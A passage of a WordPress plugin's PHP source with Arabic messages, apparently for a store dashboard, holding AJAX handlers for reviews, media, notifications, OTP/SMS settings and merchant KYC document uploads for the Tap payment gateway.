    $name   = sanitize_text_field( wp_unslash( $_POST['name'] ?? $_POST['review_name'] ?? '' ) );
    $text   = sanitize_textarea_field( wp_unslash( $_POST['text'] ?? $_POST['review_text'] ?? '' ) );
    $rating = max( 1, min( 5, intval( $_POST['rating'] ?? $_POST['review_rating'] ?? 5 ) ) );
    $image  = max( 0, intval( $_POST['image'] ?? $_POST['review_image'] ?? 0 ) );

    if ( ! empty( $_FILES['review_image']['name'] ) ) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $attachment_id = media_handle_upload( 'review_image', 0 );
        if ( is_wp_error( $attachment_id ) ) {
            wp_send_json_error( array( 'message' => $attachment_id->get_error_message() ) );
        }
        $image = (int) $attachment_id;
    }

    if ( empty( $name ) || empty( $text ) ) {
        wp_send_json_error( array( 'message' => 'الاسم والنص مطلوبان.' ) );
    }

    $edit_index = isset( $_POST['edit_index'] ) && $_POST['edit_index'] !== '' ? intval( $_POST['edit_index'] ) : -1;

    if ( $edit_index >= 0 && isset( $reviews[ $edit_index ] ) && $image === 0 && empty( $_FILES['review_image']['name'] ) ) {
        $image = (int) ( $reviews[ $edit_index ]['image'] ?? 0 );
    }

    $item = array(
        'name'   => $name,
        'text'   => $text,
        'rating' => $rating,
        'image'  => $image,
    );

    if ( $edit_index >= 0 && isset( $reviews[ $edit_index ] ) ) {
        $reviews[ $edit_index ] = $item;
    } else {
        $reviews[] = $item;
    }

    do_action( 'ydash_save_reviews', $reviews );
    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_delete_review', 'yamamah_ajax_delete_review' );
function yamamah_ajax_delete_review() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $idx = intval( $_POST['index'] ?? $_POST['review_index'] ?? -1 );
    $reviews = apply_filters( 'ydash_get_reviews', array() );
    if ( ! is_array( $reviews ) ) $reviews = array();

    if ( $idx >= 0 && isset( $reviews[ $idx ] ) ) {
        array_splice( $reviews, $idx, 1 );
        do_action( 'ydash_save_reviews', $reviews );
    }
    wp_send_json_success();
}

/* =========================================
 * AJAX — Logo Management
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_logo', 'yamamah_ajax_save_logo' );
function yamamah_ajax_save_logo() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }
    $type = sanitize_text_field( $_POST['type'] ?? '' );
    $id   = intval( $_POST['attachment_id'] ?? 0 );
    $map  = array( 'header' => 'yamamah_header_logo', 'footer' => 'yamamah_footer_logo', 'favicon' => 'yamamah_favicon' );
    if ( ! isset( $map[ $type ] ) ) {
        wp_send_json_error( array( 'message' => 'نوع غير صالح.' ) );
    }
    update_option( $map[ $type ], $id );
    if ( $type === 'favicon' ) {
        update_option( 'site_icon', $id ? $id : 0 );
    }
    wp_send_json_success();
}

/* =========================================
 * AJAX — Delete Media Attachment
 * ======================================== */
add_action( 'wp_ajax_yamamah_delete_media', 'yamamah_ajax_delete_media' );
function yamamah_ajax_delete_media() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }
    $id = intval( $_POST['attachment_id'] ?? 0 );
    if ( ! $id ) {
        wp_send_json_error( array( 'message' => 'معرف غير صالح.' ) );
    }
    $result = wp_delete_attachment( $id, true );
    if ( $result ) {
        wp_send_json_success();
    }
    wp_send_json_error( array( 'message' => 'فشل الحذف.' ) );
}

/**
 * AJAX — رفع صورة من التطبيق (base64) وإرجاع attachment_id
 */
add_action( 'wp_ajax_yamamah_upload_media', 'yamamah_ajax_upload_media' );
function yamamah_ajax_upload_media() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'upload_files' ) && ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح برفع الملفات' ) );
    }

    $raw = (string) ( $_POST['file_base64'] ?? '' );
    if ( $raw === '' ) {
        wp_send_json_error( array( 'message' => 'لم تُرسل بيانات الصورة' ) );
    }

    // Support data URLs: data:image/jpeg;base64,....
    if ( preg_match( '/^data:([^;]+);base64,(.+)$/s', $raw, $m ) ) {
        $mime = sanitize_text_field( $m[1] );
        $raw  = $m[2];
    } else {
        $mime = sanitize_text_field( (string) ( $_POST['mime_type'] ?? 'image/jpeg' ) );
    }

    $binary = base64_decode( $raw, true );
    if ( false === $binary || strlen( $binary ) < 32 ) {
        wp_send_json_error( array( 'message' => 'بيانات الصورة غير صالحة' ) );
    }
    if ( strlen( $binary ) > 8 * 1024 * 1024 ) {
        wp_send_json_error( array( 'message' => 'حجم الصورة يتجاوز 8MB' ) );
    }

    $allowed = array(
        'image/jpeg' => 'jpg',
        'image/jpg'  => 'jpg',
        'image/png'  => 'png',
        'image/webp' => 'webp',
        'image/gif'  => 'gif',
    );
    if ( ! isset( $allowed[ $mime ] ) ) {
        $mime = 'image/jpeg';
    }
    $ext = $allowed[ $mime ];

    $name = sanitize_file_name( (string) ( $_POST['file_name'] ?? ( 'product-' . time() . '.' . $ext ) ) );
    if ( ! preg_match( '/\.(jpe?g|png|webp|gif)$/i', $name ) ) {
        $name .= '.' . $ext;
    }

    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    require_once ABSPATH . 'wp-admin/includes/image.php';

    $tmp = wp_tempnam( $name );
    if ( ! $tmp ) {
        wp_send_json_error( array( 'message' => 'تعذر إنشاء ملف مؤقت' ) );
    }
    // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents
    file_put_contents( $tmp, $binary );

    $file_array = array(
        'name'     => $name,
        'tmp_name' => $tmp,
        'type'     => $mime,
        'error'    => 0,
        'size'     => strlen( $binary ),
    );

    $attachment_id = media_handle_sideload( $file_array, 0 );
    if ( is_wp_error( $attachment_id ) ) {
        @unlink( $tmp );
        wp_send_json_error( array( 'message' => $attachment_id->get_error_message() ) );
    }

    $url = wp_get_attachment_image_url( (int) $attachment_id, 'medium' );
    if ( ! $url ) {
        $url = wp_get_attachment_url( (int) $attachment_id );
    }

    wp_send_json_success(
        array(
            'id'  => (int) $attachment_id,
            'url' => (string) $url,
        )
    );
}

/* =========================================
 * AJAX — Cleanup old media (remove non-theme images)
 * ======================================== */
add_action( 'wp_ajax_yamamah_cleanup_media', 'yamamah_ajax_cleanup_media' );
function yamamah_ajax_cleanup_media() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }

    $theme_asset_names = array();
    $theme_assets_dir = get_stylesheet_directory() . '/assets';
    if ( is_dir( $theme_assets_dir ) ) {
        $asset_files = scandir( $theme_assets_dir );
        if ( $asset_files ) {
            foreach ( $asset_files as $file ) {
                if ( $file === '.' || $file === '..' || is_dir( $theme_assets_dir . '/' . $file ) ) {
                    continue;
                }
                $theme_asset_names[] = pathinfo( $file, PATHINFO_FILENAME );
            }
        }
    }

    $protected_ids = array();
    $logo_opts = array( 'yamamah_header_logo', 'yamamah_footer_logo', 'yamamah_favicon', 'site_icon' );
    foreach ( $logo_opts as $opt ) {
        $v = intval( get_option( $opt, 0 ) );
        if ( $v ) $protected_ids[] = $v;
    }
    $home_content = apply_filters( 'ydash_get_homepage_settings', array() );
    if ( is_array( $home_content ) ) {
        foreach ( $home_content as $k => $v ) {
            if ( strpos( $k, 'image' ) !== false && intval( $v ) ) {
                $protected_ids[] = intval( $v );
            }
        }
    }

    $attachments = get_posts( array(
        'post_type'      => 'attachment',
        'posts_per_page' => -1,
        'post_status'    => 'inherit',
        'fields'         => 'ids',
    ) );

    $deleted = 0;
    foreach ( $attachments as $att_id ) {
        if ( in_array( $att_id, $protected_ids ) ) continue;

        $filename = pathinfo( get_attached_file( $att_id ), PATHINFO_FILENAME );
        $filename_clean = preg_replace( '/-\d+x\d+$/', '', $filename );
        $filename_clean = preg_replace( '/-\d+$/', '', $filename_clean );

        $is_theme_asset = false;
        foreach ( $theme_asset_names as $name ) {
            if ( $filename_clean === $name || $filename === $name ) {
                $is_theme_asset = true;
                break;
            }
        }
        if ( $is_theme_asset ) continue;

        if ( get_post_meta( $att_id, '_wp_attachment_is_custom_header', true ) ) continue;

        $parent = wp_get_post_parent_id( $att_id );
        if ( $parent && get_post_type( $parent ) === 'product' ) continue;

        wp_delete_attachment( $att_id, true );
        $deleted++;
    }

    wp_send_json_success( array( 'deleted' => $deleted ) );
}

/* =========================================
 * AJAX — Save Policy Content
 * ======================================== */
add_action( 'wp_ajax_yamamah_save_policy', 'yamamah_ajax_save_policy' );
function yamamah_ajax_save_policy() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية.' ) );
    }
    $page_id = intval( $_POST['page_id'] ?? 0 );
    $slug    = sanitize_text_field( $_POST['policy_slug'] ?? '' );
    $allowed = array_keys( apply_filters( 'ydash_policy_pages', array() ) );
    if ( ! $page_id || empty( $allowed ) || ! in_array( $slug, $allowed, true ) ) {
        wp_send_json_error( array( 'message' => 'بيانات غير صالحة.' ) );
    }
    $title   = sanitize_text_field( wp_unslash( $_POST['policy_title'] ?? '' ) );
    $content = wp_kses_post( wp_unslash( $_POST['policy_content'] ?? '' ) );
    wp_update_post( array(
        'ID'           => $page_id,
        'post_title'   => $title,
        'post_content' => $content,
    ) );
    wp_send_json_success();
}

/* =========================================
 * AJAX — Update My Account Profile
 * ======================================== */
add_action( 'wp_ajax_yamamah_update_profile', 'yamamah_ajax_update_profile' );
function yamamah_ajax_update_profile() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    $user_id = get_current_user_id();
    if ( ! $user_id ) {
        wp_send_json_error( array( 'message' => 'غير مسجل الدخول.' ) );
    }

    $display_name = sanitize_text_field( wp_unslash( $_POST['display_name'] ?? '' ) );
    $first_name   = sanitize_text_field( wp_unslash( $_POST['first_name'] ?? '' ) );
    $last_name    = sanitize_text_field( wp_unslash( $_POST['last_name'] ?? '' ) );
    $email        = sanitize_email( $_POST['email'] ?? '' );
    $phone        = sanitize_text_field( $_POST['phone'] ?? '' );
    $new_pass     = $_POST['new_password'] ?? '';
    $confirm_pass = $_POST['confirm_password'] ?? '';

    if ( $display_name === '' ) {
        wp_send_json_error( array( 'message' => 'الاسم المعروض مطلوب.' ) );
    }

    if ( $email === '' || ! is_email( $email ) ) {
        wp_send_json_error( array( 'message' => 'البريد الإلكتروني غير صالح.' ) );
    }

    $existing = email_exists( $email );
    if ( $existing && $existing !== $user_id ) {
        wp_send_json_error( array( 'message' => 'البريد الإلكتروني مستخدم من حساب آخر.' ) );
    }

    $user_data = array(
        'ID'           => $user_id,
        'display_name' => $display_name,
        'first_name'   => $first_name,
        'last_name'    => $last_name,
        'user_email'   => $email,
    );

    if ( $new_pass !== '' ) {
        if ( strlen( $new_pass ) < 6 ) {
            wp_send_json_error( array( 'message' => 'كلمة المرور يجب أن تكون 6 أحرف على الأقل.' ) );
        }
        if ( $new_pass !== $confirm_pass ) {
            wp_send_json_error( array( 'message' => 'كلمة المرور وتأكيدها غير متطابقتين.' ) );
        }
        $user_data['user_pass'] = $new_pass;
    }

    $result = wp_update_user( $user_data );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( array( 'message' => $result->get_error_message() ) );
    }

    update_user_meta( $user_id, 'billing_phone', $phone );

    wp_send_json_success( array( 'message' => 'تم تحديث البيانات بنجاح.' ) );
}

// ================================================================
//  نظام الإشعارات — Notifications System
// ================================================================

function yamamah_get_notifications_option() {
    return get_option( 'yamamah_notifications', array() );
}

/**
 * نص إشعار نظيف بدون HTML (أسعار WooCommerce غالباً ترجع span).
 *
 * @param string $message
 * @return string
 */
function yamamah_sanitize_notification_text( $message ) {
    $text = html_entity_decode( wp_strip_all_tags( (string) $message ), ENT_QUOTES, 'UTF-8' );
    $text = preg_replace( '/\s+/u', ' ', $text );
    return trim( (string) $text );
}

/**
 * رسالة إشعار طلب: العميل — الخدمة — التاريخ — المبلغ.
 *
 * @param WC_Order $order
 * @return string
 */
function yamamah_format_order_notification_message( $order ) {
    if ( ! $order || ! is_a( $order, 'WC_Order' ) ) {
        return '';
    }

    $customer = trim( $order->get_billing_first_name() . ' ' . $order->get_billing_last_name() );
    if ( $customer === '' ) {
        $customer = $order->get_billing_email() ? (string) $order->get_billing_email() : 'زائر';
    }

    $names = array();
    foreach ( $order->get_items() as $item ) {
        $name = trim( (string) $item->get_name() );
        if ( $name !== '' ) {
            $names[] = $name;
        }
    }
    $names    = array_values( array_unique( $names ) );
    $services = '';
    if ( $names ) {
        $shown    = array_slice( $names, 0, 3 );
        $services = implode( '، ', $shown );
        if ( count( $names ) > 3 ) {
            $services .= '…';
        }
    }

    $when = '';
    $created = $order->get_date_created();
    if ( $created ) {
        $when = $created->date_i18n( 'Y-m-d H:i' );
    }

    $total = number_format( (float) $order->get_total(), 2, '.', '' );
    $curr  = yamamah_sanitize_notification_text( get_woocommerce_currency_symbol() );
    if ( $curr === '' ) {
        $curr = (string) get_woocommerce_currency();
    }
    $amount = $total . ' ' . $curr;

    $parts = array_filter( array( $customer, $services, $when, $amount ) );
    return implode( ' — ', $parts );
}

/**
 * استخراج order_id من إشعار.
 *
 * @param array $notif
 * @return int
 */
function yamamah_notification_order_id( $notif ) {
    if ( ! is_array( $notif ) ) {
        return 0;
    }
    if ( ! empty( $notif['order_id'] ) ) {
        return absint( $notif['order_id'] );
    }
    if ( ! empty( $notif['url'] ) && preg_match( '/order_id=(\d+)/', (string) $notif['url'], $m ) ) {
        return absint( $m[1] );
    }
    return 0;
}

/**
 * مزود الخدمة المرتبط بإشعار الطلب/الحجز.
 *
 * @param array $notif
 * @return int
 */
function yamamah_notification_provider_id( $notif ) {
    if ( ! is_array( $notif ) ) {
        return 0;
    }
    if ( ! empty( $notif['provider_id'] ) ) {
        return absint( $notif['provider_id'] );
    }
    $order_id = yamamah_notification_order_id( $notif );
    if ( ! $order_id || ! function_exists( 'wc_get_order' ) ) {
        return 0;
    }
    $order = wc_get_order( $order_id );
    if ( ! $order ) {
        return 0;
    }
    $provider_id = (int) $order->get_meta( '_lumiere_booking_expert_provider_id', true );
    if ( ! $provider_id ) {
        foreach ( $order->get_items() as $item ) {
            $provider_id = (int) $item->get_meta( '_lumiere_booking_expert_provider_id', true );
            if ( $provider_id ) {
                break;
            }
        }
    }
    return $provider_id;
}

/**
 * مزود الخدمة يرى فقط إشعارات الحجوزات المعينة عليه.
 *
 * @param array        $notifs
 * @param WP_User|null $user
 * @return array
 */
function yamamah_filter_notifications_for_user( $notifs, $user = null ) {
    if ( ! is_array( $notifs ) ) {
        return array();
    }
    if ( ! $user instanceof WP_User ) {
        $user = wp_get_current_user();
    }
    if ( ! function_exists( 'yamamah_user_is_provider' ) || ! yamamah_user_is_provider( $user ) ) {
        return $notifs;
    }

    $my_provider_id = function_exists( 'yamamah_user_provider_id' ) ? yamamah_user_provider_id( $user ) : 0;
    if ( ! $my_provider_id ) {
        return array();
    }

    $allowed_types = array( 'order', 'cancel', 'refund' );
    $out           = array();
    foreach ( $notifs as $n ) {
        if ( ! is_array( $n ) ) {
            continue;
        }
        $type = (string) ( $n['type'] ?? '' );
        if ( ! in_array( $type, $allowed_types, true ) ) {
            continue;
        }
        $notif_provider = yamamah_notification_provider_id( $n );
        if ( $notif_provider && (int) $notif_provider === (int) $my_provider_id ) {
            $out[] = $n;
        }
    }
    return $out;
}

/**
 * تنظيف وقفل قائمة الإشعارات قبل إرسالها للتطبيق / AJAX.
 *
 * @param array $notifs
 * @return array
 */
function yamamah_prepare_notifications_for_client( $notifs ) {
    if ( ! is_array( $notifs ) ) {
        return array();
    }
    $notifs = yamamah_filter_notifications_for_user( $notifs );
    $out    = array();
    foreach ( $notifs as $n ) {
        if ( ! is_array( $n ) ) {
            continue;
        }
        $n['title']   = yamamah_sanitize_notification_text( $n['title'] ?? '' );
        $n['message'] = yamamah_sanitize_notification_text( $n['message'] ?? '' );
        $out[]        = $n;
    }
    return $out;
}

/**
 * @param string $type
 * @param string $title
 * @param string $message
 * @param string $url
 * @param array  $extra order_id / provider_id ...
 */
function yamamah_add_notification( $type, $title, $message, $url = '', $extra = array() ) {
    $notif = array(
        'id'      => wp_generate_uuid4(),
        'type'    => $type,
        'title'   => yamamah_sanitize_notification_text( $title ),
        'message' => yamamah_sanitize_notification_text( $message ),
        'url'     => $url,
        'read'    => false,
        'time'    => gmdate( 'Y-m-d H:i:s' ), // Bug #109: store UTC so JS can parse with 'Z' suffix
    );
    if ( is_array( $extra ) ) {
        if ( ! empty( $extra['order_id'] ) ) {
            $notif['order_id'] = absint( $extra['order_id'] );
        }
        if ( ! empty( $extra['provider_id'] ) ) {
            $notif['provider_id'] = absint( $extra['provider_id'] );
        }
    }
    $notifs = yamamah_get_notifications_option();
    array_unshift( $notifs, $notif );
    $notifs = array_slice( $notifs, 0, 50 );
    update_option( 'yamamah_notifications', $notifs, false );
    do_action( 'yamamah_notification_added', $notif );
}

/**
 * معرف مزود الحجز على الطلب.
 *
 * @param WC_Order $order
 * @return int
 */
function yamamah_order_assigned_provider_id( $order ) {
    if ( ! $order || ! is_a( $order, 'WC_Order' ) ) {
        return 0;
    }
    $provider_id = (int) $order->get_meta( '_lumiere_booking_expert_provider_id', true );
    if ( ! $provider_id ) {
        foreach ( $order->get_items() as $item ) {
            $provider_id = (int) $item->get_meta( '_lumiere_booking_expert_provider_id', true );
            if ( $provider_id ) {
                break;
            }
        }
    }
    return $provider_id;
}

add_action( 'woocommerce_new_order', function( $order_id ) {
    $order = wc_get_order( $order_id );
    if ( ! $order ) return;
    $store_type  = function_exists( 'yamamah_get_store_type' ) ? yamamah_get_store_type() : get_option( 'yamama_store_type', 'retail' );
    $title       = ( $store_type === 'booking' )
        ? ( 'حجز جديد #' . $order->get_order_number() )
        : ( 'طلب جديد #' . $order->get_order_number() );
    $provider_id = yamamah_order_assigned_provider_id( $order );
    yamamah_add_notification(
        'order',
        $title,
        yamamah_format_order_notification_message( $order ),
        admin_url( 'admin.php?page=yamamah-order-detail&order_id=' . $order_id ),
        array(
            'order_id'    => (int) $order_id,
            'provider_id' => $provider_id,
        )
    );
});

add_action( 'woocommerce_order_status_changed', function( $order_id, $old_status, $new_status ) {
    $order       = function_exists( 'wc_get_order' ) ? wc_get_order( $order_id ) : null;
    $provider_id = $order ? yamamah_order_assigned_provider_id( $order ) : 0;
    $extra       = array(
        'order_id'    => (int) $order_id,
        'provider_id' => $provider_id,
    );
    if ( $new_status === 'cancelled' ) {
        yamamah_add_notification(
            'cancel',
            'طلب ملغي #' . $order_id,
            'تم إلغاء الطلب',
            admin_url( 'admin.php?page=yamamah-order-detail&order_id=' . $order_id ),
            $extra
        );
    } elseif ( $new_status === 'refunded' ) {
        yamamah_add_notification(
            'refund',
            'استرداد طلب #' . $order_id,
            'تم استرداد الطلب',
            admin_url( 'admin.php?page=yamamah-order-detail&order_id=' . $order_id ),
            $extra
        );
    }
}, 10, 3 );

add_action( 'woocommerce_low_stock', function( $product ) {
    yamamah_add_notification(
        'stock',
        'مخزون منخفض',
        $product->get_name() . ' — الكمية: ' . $product->get_stock_quantity(),
        admin_url( 'admin.php?page=yamamah-products' )
    );
});

add_action( 'woocommerce_no_stock', function( $product ) {
    yamamah_add_notification(
        'stock',
        'نفاد مخزون',
        $product->get_name() . ' — نفد المخزون بالكامل',
        admin_url( 'admin.php?page=yamamah-products' )
    );
});

add_action( 'user_register', function( $user_id ) {
    $user = get_userdata( $user_id );
    if ( ! $user ) return;
    yamamah_add_notification(
        'customer',
        'عميل جديد',
        $user->display_name ?: $user->user_email,
        admin_url( 'admin.php?page=yamamah-users' )
    );
});

add_action( 'wp_ajax_yamamah_get_notifications', 'yamamah_ajax_get_notifications' );
function yamamah_ajax_get_notifications() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    $notifs = yamamah_prepare_notifications_for_client( yamamah_get_notifications_option() );
    $unread = 0;
    foreach ( $notifs as $n ) {
        if ( empty( $n['read'] ) ) $unread++;
    }
    wp_send_json_success( array(
        'notifications' => array_slice( $notifs, 0, 20 ),
        'unread'        => $unread,
    ));
}

add_action( 'wp_ajax_yamamah_mark_notification_read', 'yamamah_ajax_mark_notification_read' );
function yamamah_ajax_mark_notification_read() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    $nid = isset( $_POST['notification_id'] ) ? sanitize_text_field( $_POST['notification_id'] ) : '';
    if ( ! $nid ) wp_send_json_error();
    $notifs = yamamah_get_notifications_option();
    foreach ( $notifs as &$n ) {
        if ( $n['id'] === $nid ) {
            $n['read'] = true;
            break;
        }
    }
    unset( $n );
    update_option( 'yamamah_notifications', $notifs, false );
    wp_send_json_success();
}

add_action( 'wp_ajax_yamamah_mark_all_notifications_read', 'yamamah_ajax_mark_all_read' );
function yamamah_ajax_mark_all_read() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    $notifs = yamamah_get_notifications_option();
    foreach ( $notifs as &$n ) {
        $n['read'] = true;
    }
    unset( $n );
    update_option( 'yamamah_notifications', $notifs, false );
    wp_send_json_success();
}

/* ================================================================
 * SMS Settings AJAX handlers
 * ============================================================== */

add_action( 'wp_ajax_yamamah_save_sms_settings', 'yamamah_ajax_save_sms_settings' );
function yamamah_ajax_save_sms_settings() {
    $nonce_ok = check_ajax_referer( 'yamamah_nonce', 'nonce', false )
        || check_ajax_referer( 'yamamah_save_sms', 'yamamah_sms_nonce', false );
    if ( ! $nonce_ok ) {
        wp_send_json_error( array( 'message' => 'فشل التحقق الأمني.' ) );
    }
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ) );
    }
    $otp_login    = ( isset( $_POST['otp_login'] ) && ( $_POST['otp_login'] === 'yes' || $_POST['otp_login'] === '1' || $_POST['otp_login'] === true ) ) ? 'yes' : 'no';
    $otp_register = ( isset( $_POST['otp_register'] ) && ( $_POST['otp_register'] === 'yes' || $_POST['otp_register'] === '1' || $_POST['otp_register'] === true ) ) ? 'yes' : 'no';
    update_option( 'yamama_otp_login', $otp_login );
    update_option( 'yamama_otp_register', $otp_register );

    // Bug #70: حفظ اسم مرسل OTP للمنصة.
    if ( isset( $_POST['platform_sender'] ) ) {
        $sender = sanitize_text_field( wp_unslash( $_POST['platform_sender'] ) );
        $sender = preg_replace( '/[^a-zA-Z0-9]/', '', $sender );
        $sender = substr( $sender, 0, 11 );
        update_option( 'yamama_sms_platform_sender', $sender );
    }

    // Bug #96: حفظ مدة صلاحية OTP.
    if ( isset( $_POST['otp_expiry_minutes'] ) ) {
        $minutes = max( 1, min( 30, intval( $_POST['otp_expiry_minutes'] ) ) );
        update_option( 'yamama_otp_expiry_seconds', $minutes * 60 );
    }

    wp_send_json_success( array( 'message' => 'تم حفظ إعدادات OTP بنجاح.' ) );
}

add_action( 'wp_ajax_yamamah_save_sms_gateway', 'yamamah_ajax_save_sms_gateway' );
function yamamah_ajax_save_sms_gateway() {
    $nonce_ok = check_ajax_referer( 'yamamah_nonce', 'nonce', false )
        || check_ajax_referer( 'yamamah_save_sms_gateway', 'yamamah_sms_gw_nonce', false );
    if ( ! $nonce_ok ) {
        wp_send_json_error( array( 'message' => 'فشل التحقق الأمني.' ) );
    }
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ) );
    }

    $provider = sanitize_text_field( wp_unslash( $_POST['sms_provider'] ?? 'platform' ) );
    update_option( 'yamama_sms_provider', $provider );

    if ( $provider === 'custom' ) {
        update_option( 'yamama_sms_custom_token', sanitize_text_field( wp_unslash( $_POST['custom_token'] ?? '' ) ) );
        update_option( 'yamama_sms_custom_sender', sanitize_text_field( wp_unslash( $_POST['custom_sender'] ?? '' ) ) );
    }

    wp_send_json_success( array( 'message' => 'تم حفظ إعدادات البوابة بنجاح.' ) );
}

add_action( 'wp_ajax_yamamah_test_sms_gateway', 'yamamah_ajax_test_sms_gateway' );
function yamamah_ajax_test_sms_gateway() {
    $nonce_ok = check_ajax_referer( 'yamamah_nonce', 'nonce', false )
        || check_ajax_referer( 'yamamah_save_sms_gateway', '_wpnonce', false );
    if ( ! $nonce_ok ) {
        wp_send_json_error( array( 'message' => 'فشل التحقق الأمني.' ) );
    }
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ) );
    }

    $token = sanitize_text_field( wp_unslash( $_POST['token'] ?? $_POST['custom_token'] ?? '' ) );
    if ( empty( $token ) ) {
        wp_send_json_error( array( 'message' => 'التوكن مطلوب.' ) );
    }

    require_once YAMAMAH_PLUGIN_DIR . 'includes/sms/TaqnyatSms.php';
    $taqnyat = new Yamamah_TaqnyatSms( $token );
    $result  = $taqnyat->balance();

    if ( ! empty( $result['success'] ) ) {
        $bal = isset( $result['response']['balance'] ) ? $result['response']['balance'] : '—';
        wp_send_json_success( array( 'message' => "الاتصال ناجح. الرصيد: {$bal}" ) );
    }
    wp_send_json_error( array( 'message' => $result['error'] ?? 'فشل الاتصال.' ) );
}

/* OTP AJAX for customer-facing store (login/register OTP) */
add_action( 'wp_ajax_nopriv_yamamah_store_send_otp', 'yamamah_store_send_otp' );
add_action( 'wp_ajax_yamamah_store_send_otp', 'yamamah_store_send_otp' );
function yamamah_store_send_otp() {
    if ( ! class_exists( 'Yamamah_SMS_Manager' ) || ! Yamamah_SMS_Manager::is_enabled() ) {
        wp_send_json_error( [ 'message' => 'خدمة SMS غير متاحة.' ] );
    }

    $phone = sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) );
    if ( empty( $phone ) ) {
        wp_send_json_error( [ 'message' => 'يرجى إدخال رقم الجوال.' ] );
    }

    $result = Yamamah_SMS_Manager::send_otp( $phone );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( [ 'message' => $result->get_error_message() ] );
    }
    wp_send_json_success( [ 'message' => 'تم إرسال رمز التحقق.' ] );
}

add_action( 'wp_ajax_nopriv_yamamah_store_verify_otp', 'yamamah_store_verify_otp' );
add_action( 'wp_ajax_yamamah_store_verify_otp', 'yamamah_store_verify_otp' );
function yamamah_store_verify_otp() {
    if ( ! class_exists( 'Yamamah_SMS_Manager' ) ) {
        wp_send_json_error( [ 'message' => 'خدمة SMS غير متاحة.' ] );
    }

    $phone = sanitize_text_field( wp_unslash( $_POST['phone'] ?? '' ) );
    $code  = sanitize_text_field( wp_unslash( $_POST['otp_code'] ?? '' ) );

    $result = Yamamah_SMS_Manager::verify_otp( $phone, $code );
    if ( is_wp_error( $result ) ) {
        wp_send_json_error( [ 'message' => $result->get_error_message() ] );
    }
    wp_send_json_success( [ 'message' => 'تم التحقق بنجاح.', 'verified' => true ] );
}

/* =====================================================================
 * Tap Onboarding — رفع/حذف/استعراض وثائق KYC للتاجر
 *
 * المسار:
 *   لوحة التاجر → AJAX → REST tap-payments داخل المتجر → REST yaamama-tap-platform
 *   على المنصة الأم → POST /v2/files إلى Tap → file_id يعود ويُحفظ محلياً.
 *
 * الوثائق المدعومة (purpose):
 *   commercial_registration | identity_document | bank_certificate |
 *   tax_document_user_upload | memorandum_association |
 *   article_of_association | business_logo
 *
 * الـ file_id يحفظ في خيار `yamama_tap_doc_{purpose}` ويستخدم لاحقاً
 * عند الضغط على "فعّل بوابة الدفع" لبناء جسم Lead V3 الكامل.
 * ===================================================================== */

if ( ! function_exists( 'yamamah_tap_doc_purposes' ) ) {
    function yamamah_tap_doc_purposes() {
        return array(
            'commercial_registration'  => array( 'label' => 'السجل التجاري',         'required' => true,  'max_kb' => 10240, 'accept' => '.jpg,.jpeg,.png,.pdf' ),
            'identity_document'        => array( 'label' => 'صورة الهوية الوطنية',  'required' => true,  'max_kb' => 10240, 'accept' => '.jpg,.jpeg,.png' ),
            'bank_certificate'         => array( 'label' => 'شهادة IBAN',            'required' => true,  'max_kb' => 10240, 'accept' => '.jpg,.jpeg,.png,.pdf' ),
            'tax_document_user_upload' => array( 'label' => 'الشهادة الضريبية',      'required' => false, 'max_kb' => 16384, 'accept' => '.jpg,.jpeg,.png,.pdf,.xls,.xlsx' ),
            'memorandum_association'   => array( 'label' => 'عقد التأسيس',          'required' => false, 'max_kb' => 10240, 'accept' => '.jpg,.jpeg,.png,.pdf' ),
            'article_of_association'   => array( 'label' => 'النظام الأساسي',       'required' => false, 'max_kb' => 10240, 'accept' => '.jpg,.jpeg,.png,.pdf' ),
            'business_logo'            => array( 'label' => 'شعار المتجر',          'required' => false, 'max_kb' => 512,   'accept' => '.gif,.jpg,.jpeg,.png' ),
        );
    }
}

add_action( 'wp_ajax_yamamah_upload_tap_document', 'yamamah_ajax_upload_tap_document' );
function yamamah_ajax_upload_tap_document() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ), 403 );
    }

    $purpose  = isset( $_POST['purpose'] ) ? sanitize_text_field( wp_unslash( $_POST['purpose'] ) ) : '';
    $purposes = yamamah_tap_doc_purposes();
    if ( ! isset( $purposes[ $purpose ] ) ) {
        wp_send_json_error( array( 'message' => 'نوع الوثيقة غير معروف.' ), 400 );
    }
